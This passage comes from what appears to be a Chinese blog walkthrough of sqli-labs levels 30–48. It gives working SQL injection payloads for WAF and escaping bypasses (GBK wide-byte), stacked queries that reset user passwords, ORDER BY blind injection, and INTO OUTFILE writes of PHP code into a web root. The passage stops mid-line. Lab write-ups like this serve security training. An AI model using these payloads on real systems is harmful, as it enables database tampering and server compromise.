href="https://blog.csdn.net/m0_37292262/article/details/80622840">Windows10上安装Apache Tomcat 9 详细教程（亲测绝对有效）</a><br><a href="https://blog.csdn.net/qq_43263647/article/details/105493277?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-1.queryctrv2&spm=1001.2101.3001.4242.2&utm_relevant_index=4">IDEA中导入mysql的驱动jar包</a><br><a href="https://blog.csdn.net/weixin_48557496/article/details/113776824">将驱动mysql-connector-java.jar包导入IDEA</a></p><h3 id="level-30"><a href="#level-30" class="headerlink" title="level-30"></a>level-30</h3><p><strong>WAF简单绕过-参数解析-双引号</strong><br>类似level-29,不深入展示</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:<span class="number">9090</span>/sqli-labs/Less-<span class="number">30</span>/?<span class="built_in">id</span>=<span class="number">123</span>&amp;<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&quot;union select 1,2,database()#</span></span><br></pre></td></tr></table></figure><p><img src="/2022/02/17/sqli-labs/2022-02-23-19-18-18.png"></p><h3 id="level-31"><a href="#level-31" class="headerlink" title="level-31"></a>level-31</h3><p><strong>WAF简单绕过-参数解析-双引号-单括号</strong><br>类似level-29,不深入展示</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:<span class="number">9090</span>/sqli-labs/Less-<span class="number">31</span>/?<span class="built_in">id</span>=<span class="number">456</span>&amp;<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&quot;) union select 1,2,database()%23</span></span><br></pre></td></tr></table></figure><p><img src="/2022/02/17/sqli-labs/2022-02-23-19-21-23.png"></p><h3 id="level-32"><a href="#level-32" class="headerlink" title="level-32"></a>level-32</h3><p><strong>tomcat，单引号-单括号注入</strong><br>原理和PHP一样</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET data</span><br><span class="line">http://localhost:<span class="number">9090</span>/sqli-labs/Less-<span class="number">32</span>/?<span class="built_in">id</span>=<span class="number">1</span><span class="string">&#x27;) union select 1,2,3%23 </span></span><br><span class="line"><span class="string">回显</span></span><br><span class="line"><span class="string">Username: Dumb</span></span><br><span class="line"><span class="string">Password: Username: 2</span></span><br><span class="line"><span class="string">Password: 3</span></span><br></pre></td></tr></table></figure><p><strong>apache ,宽字节注入</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_addslashes</span>(<span class="params"><span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/&#x27;</span>. <span class="title function_ invoke__">preg_quote</span>(<span class="string">&#x27;\\&#x27;</span>) .<span class="string">&#x27;/&#x27;</span>, <span class="string">&quot;\\\\\\&quot;</span>, <span class="variable">$string</span>);          <span class="comment">//escape any backslash</span></span><br><span class="line">    <span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/\&#x27;/i&#x27;</span>, <span class="string">&#x27;\\\&#x27;&#x27;</span>, <span class="variable">$string</span>);                               <span class="comment">//escape single quote with a backslash</span></span><br><span class="line">    <span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/\&quot;/&#x27;</span>, <span class="string">&quot;\\\&quot;&quot;</span>, <span class="variable">$string</span>);                                <span class="comment">//escape double quote with a backslash</span></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$string</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>过滤了 反斜杠\ 单引号 双引号  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql_query(<span class="string">&quot;SET NAMES gbk&quot;</span>);</span><br></pre></td></tr></table></figure><p>将编码设置为 GBK，可能会导致编码问题，MySQL 在使用GBK编码时，会认为两个字符为一个汉字，比如  <code>%bb%5c</code>是一个宽字符（前一个 ASCII 码大于 128 才能到汉字的范围）<a href="#refer-anchor-5"><sup>1</sup></a>，会被认为是一个汉字即 籠。<br>而我们输入单引号 <code>&#39;</code> 即 <code>%27</code>，会被转义成 <code>\&#39;</code> 即  <code>%5c%27</code>，所以哦我们可以构造  <code>%bb%27</code>,被转义后为  <code>%bb%5c%27</code>，即<code>籠&#39;</code>，就饶过了单引号的转义。<br>还有就是利用单引号对单引号的转义，比如<code>\\\\&#39;</code>即<code>\\&#39;</code>  ，构造<code>%bb%5c%5c%%27</code>,转义的时候，会在<code>%5c</code>前加<code>%5c</code>，<code>%27</code>前加<code>%5c</code>即<code>%bb %5c%5c %5c %5c %5c%27</code>，即<code>%bb%5c %5c%5c %5c%5c %27</code>，即籠<code>\\&#39;</code><br>所以就是利用这个特性，把单引号释放出来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET data</span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">32</span>/?<span class="built_in">id</span>=-<span class="number">1</span>%bb%<span class="number">27</span> union select <span class="number">1</span>,<span class="number">2</span>,username <span class="keyword">from</span> users limit <span class="number">2</span>,<span class="number">1</span>%<span class="number">23</span></span><br><span class="line">后端</span><br><span class="line">SELECT * FROM users WHERE <span class="built_in">id</span>=<span class="string">&#x27;-1�\&#x27; union select 1,2,username from users limit 2,1#&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span></span><br><span class="line">回显</span><br><span class="line">Your Login name:<span class="number">2</span></span><br><span class="line">Your Password:Dummy</span><br></pre></td></tr></table></figure><p>另一种方法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET data</span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">32</span>/?<span class="built_in">id</span>=-<span class="number">1</span>%bb%5c%5c%<span class="number">27</span> union select <span class="number">1</span>,<span class="number">2</span>,username <span class="keyword">from</span> users limit <span class="number">2</span>,<span class="number">1</span>%<span class="number">23</span></span><br><span class="line">转义后</span><br><span class="line">SELECT * FROM users WHERE <span class="built_in">id</span>=<span class="string">&#x27;-1�\\\\\&#x27; union select 1,2,username from users limit 2,1#&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span></span><br><span class="line">回显</span><br><span class="line">Your Login name:<span class="number">2</span></span><br><span class="line">Your Password:Dummy</span><br></pre></td></tr></table></figure><p><strong>引用：</strong></p><div id="refer-anchor-5"></div><ul><li>[1] <a href="https://www.jianshu.com/p/fa6664786f73">Sqli-Labs：Less 32 - Less 33</a></li></ul><h3 id="level-33"><a href="#level-33" class="headerlink" title="level-33"></a>level-33</h3><p>用的php原生addslashes函数<br>exp和level-32一样</p><h3 id="level-34"><a href="#level-34" class="headerlink" title="level-34"></a>level-34</h3><p><strong>POST型-addslashes过滤-单引号</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST data</span><br><span class="line">uname=a%bb%27union select <span class="number">1</span>,<span class="number">2</span>%<span class="number">23</span>&amp;passwd=a&amp;submit=Submit</span><br><span class="line">后端</span><br><span class="line">SELECT username, password FROM users WHERE username=<span class="string">&#x27;a»\&#x27;union select 1,2#&#x27;</span> <span class="keyword">and</span> password=<span class="string">&#x27;a&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span></span><br><span class="line">回显</span><br><span class="line">&gt;Your Login name:<span class="number">1</span>&lt;br&gt;Your Password:<span class="number">2</span></span><br></pre></td></tr></table></figure><p>还有一种，使用一个utf转码，例如使用 UTF-8 的’转换为 UTF-16 的�’<br>也可以，但是我测试使用%bb 和�的长度一样，而�的ascii是0xfffd，很奇怪，待补充</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST</span><br><span class="line">uname=aý%27union select <span class="number">1</span>,<span class="number">2</span>%<span class="number">23</span>&amp;passwd=a&amp;submit=Submit</span><br><span class="line">拼接后</span><br><span class="line">&gt;SELECT username, password FROM users WHERE username=<span class="string">&#x27;aý\&#x27;union select 1,2#&#x27;</span> <span class="keyword">and</span> password=<span class="string">&#x27;a&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span></span><br><span class="line">回显</span><br><span class="line">Your Login name:<span class="number">1</span>&lt;br&gt;Your Password:<span class="number">2</span></span><br></pre></td></tr></table></figure><h3 id="level-35"><a href="#level-35" class="headerlink" title="level-35"></a>level-35</h3><p>用的php原生addslashes函数，而且没有单引号，直接常规注入即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs/Less-35/?id=-1 union select 1,2,3%23</span><br></pre></td></tr></table></figure><h3 id="level-36"><a href="#level-36" class="headerlink" title="level-36"></a>level-36</h3><p><strong>mysql_real_escape_string-单引号-报错回显-绕过</strong><br>和前面原理一样<br>mysql_real_escape_string过滤字符如下，也是用反斜杠转义</p><ul><li>\x00</li><li>\n</li><li>\r</li><li>\</li><li>‘</li><li>“</li><li>\x1a  </li><li><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET</span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">36</span>/?<span class="built_in">id</span>=-<span class="number">1</span>%bb%<span class="number">27</span><span class="keyword">or</span> <span class="number">1</span>%<span class="number">23</span></span><br><span class="line">后端</span><br><span class="line">SELECT * FROM users WHERE <span class="built_in">id</span>=<span class="string">&#x27;-1�\&#x27;or 1#&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span></span><br><span class="line">回显</span><br><span class="line">Your Login name:Dumb</span><br><span class="line">Your Password:</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="level-37"><a href="#level-37" class="headerlink" title="level-37"></a>level-37</h3></li></ul><p><strong>POST型-mysql_real_escape_string-单引号-后报错回显-绕过</strong><br>和level-36原理一样，只不过是POST，不细致展开</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST data</span><br><span class="line">uname=a%bb%27union select <span class="number">1</span>,<span class="number">2</span>;<span class="comment">#&amp;passwd=a&amp;submit=Submit</span></span><br><span class="line"></span><br><span class="line">拼接后</span><br><span class="line">SELECT username, password FROM users WHERE username=<span class="string">&#x27;a»\&#x27;union select 1,2;#&#x27;</span> <span class="keyword">and</span> password=<span class="string">&#x27;a&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span></span><br><span class="line">回显</span><br><span class="line">Your Login name:<span class="number">1</span>&lt;br&gt;Your Password:<span class="number">2</span></span><br></pre></td></tr></table></figure><h2 id="Stacked"><a href="#Stacked" class="headerlink" title="Stacked"></a>Stacked</h2><h3 id="level-38"><a href="#level-38" class="headerlink" title="level-38"></a>level-38</h3><p><strong>GET-单引号-简单堆叠注入</strong><br>堆叠注入，即query1;query2;query……;  这样多个sql语句放在一起注入<br>这次level更改了sql查询API，mysqli_multi_query，看看它和mysql_query的区别，可以看到mysqli_multi_query可以一次使用多个语句，也就为堆叠注入创造了条件。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">mysql_query</span>(query,connection)</span><br><span class="line">query必需。规定要发送的 SQL 查询。注释：查询字符串不应以分号结束。</span><br><span class="line">connection可选。规定 SQL 连接标识符。如果未规定，则使用上一个打开的连接。</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">mysqli_multi_query</span>(connection,query);</span><br><span class="line">connection必需。规定要使用的 MySQL 连接。</span><br><span class="line">query必需。规定一个或多个查询，用分号进行分隔。</span><br></pre></td></tr></table></figure><p>所以我们就可以任意利用后面这句话，以更改密码为例</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">修改数据</span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">38</span>/?<span class="built_in">id</span>=<span class="number">1</span><span class="string">&#x27;;update users set password =&#x27;</span><span class="number">1234</span><span class="string">&#x27; where username =&#x27;</span>Dum<span class="string">b&#x27;;%23</span></span><br><span class="line"><span class="string">写入文件</span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli-labs/Less-38/?id=1&#x27;</span>;select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> into outfile <span class="string">&quot;D:\\phpstudy\\PHPTutorial\\WWW\\sqli-labs\\Less-38\\test.php&quot;</span>;%<span class="number">23</span></span><br></pre></td></tr></table></figure><p>成功修改Dumb密码</p><p><img src="/2022/02/17/sqli-labs/2022-02-24-12-48-01.png"></p><p>成功写入后台文件   </p><p><img src="/2022/02/17/sqli-labs/2022-02-24-12-48-35.png"></p><h3 id="level-39"><a href="#level-39" class="headerlink" title="level-39"></a>level-39</h3><p><strong>GET-简单堆叠注入</strong></p><p>原理同level-38<br>仅展示更新Dumb密码，不细致展开   </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">39</span>/?<span class="built_in">id</span>=<span class="number">1</span>; update users <span class="built_in">set</span> password= <span class="string">&#x27;234&#x27;</span> where username=<span class="string">&#x27;Dumb&#x27;</span>;%<span class="number">23</span></span><br></pre></td></tr></table></figure><h3 id="level-40"><a href="#level-40" class="headerlink" title="level-40"></a>level-40</h3><p><strong>GET-盲注-字符型-简单堆叠注入</strong><br>原理和之前一样，不细致展开</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs/Less-40/?id=1&#x27;);update users set password=&#x27;123&#x27; where username=&#x27;Dumb&#x27;%23 </span><br></pre></td></tr></table></figure><h3 id="level-41"><a href="#level-41" class="headerlink" title="level-41"></a>level-41</h3><p><strong>GET-盲注-整型-简单堆叠注入</strong><br>不细致展开</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">41</span>/?<span class="built_in">id</span>=<span class="number">1</span>;update users <span class="built_in">set</span> password=<span class="string">&#x27;234&#x27;</span> where username=<span class="string">&#x27;Dumb&#x27;</span>%<span class="number">23</span> </span><br></pre></td></tr></table></figure><h3 id="level-42"><a href="#level-42" class="headerlink" title="level-42"></a>level-42</h3><p><strong>POST-单引号-简单过滤-简单堆叠注入</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$username</span> = <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$con1</span>, <span class="variable">$_POST</span>[<span class="string">&quot;login_user&quot;</span>]);</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&quot;login_password&quot;</span>];</span><br><span class="line"><span class="comment">// Check connection</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">mysqli_connect_errno</span>(<span class="variable">$con1</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Failed to connect to MySQL: &quot;</span> . <span class="title function_ invoke__">mysqli_connect_error</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    @<span class="title function_ invoke__">mysqli_select_db</span>(<span class="variable">$con1</span>, <span class="variable">$dbname</span>) <span class="keyword">or</span> <span class="keyword">die</span> ( <span class="string">&quot;Unable to connect to the database ######: &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* execute multi query */</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$password</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (@<span class="title function_ invoke__">mysqli_multi_query</span>(<span class="variable">$con1</span>, <span class="variable">$sql</span>))</span><br></pre></td></tr></table></figure><p>可以看到username被过滤了，但是password没有被过滤，所以可以使用password</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST data</span><br><span class="line">login_user=a<span class="string">&#x27;&amp;login_password=a&#x27;</span>;update users <span class="built_in">set</span> password=<span class="string">&#x27;2345&#x27;</span> where username=<span class="string">&#x27;Dumb&#x27;</span>%<span class="number">23</span> &amp;mysubmit=Login   </span><br></pre></td></tr></table></figure><h3 id="level-43"><a href="#level-43" class="headerlink" title="level-43"></a>level-43</h3><p><strong>POST-单引号-单括号-简单过滤-简单堆叠注入</strong><br>与level-42原理相同，不细致展开</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login_user=a&amp;login_password=a<span class="string">&#x27;); update users set password=&#x27;</span><span class="number">111</span><span class="string">&#x27; where username=&#x27;</span>Dum<span class="string">b&#x27;%23 &amp;mysubmit=Login</span></span><br></pre></td></tr></table></figure><h3 id="level-44"><a href="#level-44" class="headerlink" title="level-44"></a>level-44</h3><p><strong>POST-单引号-盲注-简单过滤-简单堆叠注入</strong><br>与level-42原理相同，不细致展开</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login_user=a&amp;login_password=aa<span class="string">&#x27;; update users set password=&#x27;</span><span class="number">222</span><span class="string">&#x27; where username=&#x27;</span>Dum<span class="string">b&#x27;%23&amp;mysubmit=Login</span></span><br></pre></td></tr></table></figure><h3 id="level-45"><a href="#level-45" class="headerlink" title="level-45"></a>level-45</h3><p><strong>POST-单引号-单括号-简单过滤-简单堆叠注入</strong><br>原理同上</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login_user=a&amp;login_password=a<span class="string">&#x27;); update users set password=&#x27;</span><span class="number">232</span><span class="string">&#x27; where username=&#x27;</span>Dum<span class="string">b&#x27;%23&amp;mysubmit=Login</span></span><br></pre></td></tr></table></figure><h3 id="level-46"><a href="#level-46" class="headerlink" title="level-46"></a>level-46</h3><p><strong>ORDER BY-有报错回显-注入</strong><br>关键代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="string">&quot;SELECT * FROM users ORDER BY $id&quot;</span>;</span><br></pre></td></tr></table></figure><p>因为ORDER BY 后面是需要一个数字，不同的数字返回值不一样，或者没有返回，所以他和我们注入点一样，相当于一个查询字段参数，所以之前的手法都可以用<br>1、报错注入，有报错回显可用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET data</span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">46</span>/?sort=<span class="number">1</span> <span class="keyword">or</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(database()),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br><span class="line">后端</span><br><span class="line">SELECT * FROM users ORDER BY <span class="number">1</span> <span class="keyword">or</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(database()),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br><span class="line">回显</span><br><span class="line">XPATH syntax error: <span class="string">&#x27;~security~&#x27;</span></span><br></pre></td></tr></table></figure><p>2、时间盲注</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET data</span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">46</span>/?sort=<span class="number">0</span> <span class="keyword">or</span> <span class="keyword">if</span>(length(database())=<span class="number">8</span>,sleep(<span class="number">3</span>),null)</span><br><span class="line">后端</span><br><span class="line">SELECT * FROM users ORDER BY <span class="number">0</span> <span class="keyword">or</span> <span class="keyword">if</span>(length(database())=<span class="number">8</span>,sleep(<span class="number">3</span>),null)</span><br><span class="line">回显</span><br><span class="line">慢了三秒</span><br></pre></td></tr></table></figure><p>3、布尔注入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET data</span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">46</span>/?sort=<span class="number">0</span> <span class="keyword">or</span> length(database())=<span class="number">8</span></span><br><span class="line">后端</span><br><span class="line">SELECT * FROM users ORDER BY <span class="number">0</span> <span class="keyword">or</span> length(database())=<span class="number">8</span></span><br><span class="line">回显</span><br><span class="line">同order by <span class="number">1</span>,即sort=<span class="number">1</span>，因为length(database())=<span class="number">8</span> 值为真</span><br></pre></td></tr></table></figure><p>4、写入文件，需要对应参数打开</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET data</span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">46</span>/?sort=<span class="number">0</span> <span class="keyword">or</span> (select database() ) into outfile <span class="string">&quot;D:\\phpstudy\\PHPTutorial\\WWW\\sqli-labs\\Less-46\\test.php&quot;</span>;</span><br><span class="line">后端</span><br><span class="line">SELECT * FROM users ORDER BY <span class="number">0</span> <span class="keyword">or</span> (select database() ) into outfile <span class="string">&quot;D:\\phpstudy\\PHPTutorial\\WWW\\sqli-labs\\Less-46\\test.php&quot;</span>;</span><br><span class="line">回显</span><br><span class="line">成功写入</span><br></pre></td></tr></table></figure><p>phpinfo写入，利用<code> lines terminated by hex(payload)</code>,即用payload分隔每一行结果。例</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET data</span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">46</span>/?sort=<span class="number">1</span> into outfile <span class="string">&quot;D:\\phpstudy\\PHPTutorial\\WWW\\sqli-labs\\Less-46\\test.php&quot;</span> lines terminated by <span class="number">0x3c3f70687020706870696e666f28293b3f3e2020</span>;</span><br><span class="line">后端</span><br><span class="line">SELECT * FROM users ORDER BY <span class="number">1</span> into outfile <span class="string">&quot;D:\\phpstudy\\PHPTutorial\\WWW\\sqli-labs\\Less-46\\test.php&quot;</span> lines terminated by <span class="number">0x3c3f70687020706870696e666f28293b3f3e2020</span>;</span><br><span class="line">后显</span><br><span class="line">在test.php里</span><br><span class="line"><span class="number">1</span>Dumb<span class="number">232</span>&lt;?php phpinfo();?&gt;  <span class="number">2</span>Angelina&lt;?php phpinfo();?&gt;  <span class="number">3</span>…………</span><br></pre></td></tr></table></figure><p>参考：<br>MYSQL 注入天书</p><h3 id="level-47"><a href="#level-47" class="headerlink" title="level-47"></a>level-47</h3><p><strong>ORDER BY-有报错回显-单引号-注入</strong><br>原理同level-46，不过加了单引号<br>1、报错注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET DATA</span><br><span class="line">http://127.0.0.1/sqli-labs/Less-47/?sort=1&#x27; or updatexml(1,concat(0x7e,(database()),0x7e),1) or &#x27;</span><br><span class="line">后端</span><br><span class="line">SELECT * FROM users ORDER BY &#x27;1&#x27; or updatexml(1,concat(0x7e,(database()),0x7e),1) or &#x27;&#x27;</span><br><span class="line">回显</span><br><span class="line">XPATH syntax error: &#x27;~security~&#x27;</span><br></pre></td></tr></table></figure><p>2、文件写入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET DATA</span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">47</span>/?sort=<span class="number">1</span><span class="string">&#x27; into outfile &quot;D:\\phpstudy\\PHPTutorial\\WWW\\sqli-labs\\Less-47\\test.php&quot; lines terminated by 0x3c3f70687020706870696e666f28293b3f3e2020  %23</span></span><br><span class="line"><span class="string">后端</span></span><br><span class="line"><span class="string">SELECT * FROM users ORDER BY &#x27;</span><span class="number">1</span><span class="string">&#x27; into outfile &quot;D:\\phpstudy\\PHPTutorial\\WWW\\sqli-labs\\Less-47\\test.php&quot; lines terminated by 0x3c3f70687020706870696e666f28293b3f3e2020 #&#x27;</span></span><br><span class="line">回显，test.php</span><br><span class="line"><span class="number">1</span>Dumb<span class="number">232</span>&lt;?php phpinfo();?&gt;  <span class="number">2</span>Angelina&lt;?php phpinfo();?&gt;  <span class="number">3</span></span><br></pre></td></tr></table></figure><p>剩下都一样，注意前后闭合即可，不详细展示了，</p><h3 id="level-48"><a href="#level-48" class="headerlink" title="level-48"></a>level-48</h3><p><strong>ORDER BY-无报错回显-盲注-注入</strong><br>1、布尔注入，时间盲注不展开，类似</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET DATA</span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">48</span>/?sort=<span class="number">0</span> <span class="keyword">or</span> length(database())=<span class="number">8</span></span><br><span class="line">后端</span><br><span class="line">SELECT * FROM users ORDER BY <span class="number">0</span> <span class="keyword">or</span> length(database())=<span class="number">8</span></span><br><span class="line">回显</span><br><span class="line">等同于order by <span class="number">1</span>,即sort=<span class="number">1</span></span><br></pre></td></tr></table></figure><p>2、文件写入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET DATA</span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">48</span>/?sort=<span class="number">1</span> into outfile <span class="string">&quot;D:\\phpstudy\\PHPTutorial\\WWW\\sqli-labs\\Less-48\\test.php&quot;</span> lines terminated by <span class="number">0x3c3f70687020706870696e666f28293b3f3e2020</span> </span><br><span class="line">后端</span><br><span class="line">SELECT * FROM users ORDER BY <span class="number">1</span> into outfile <span class="string">&quot;D:\\phpstudy\\PHPTutorial\\WWW\\sqli-labs\\Less-48\\test.php&quot;</span> lines terminated by <span class="number">0x3c3f70687020706870696e666f28293b3f3e2020</span></span><br><span class="line">回显 test.php</span><br><span class="line"><span class="number">1</span>Dumb<span class="number">232</span>&lt;?php phpinfo();?&gt;  <span class="number">2</span>Angelina&lt;?php 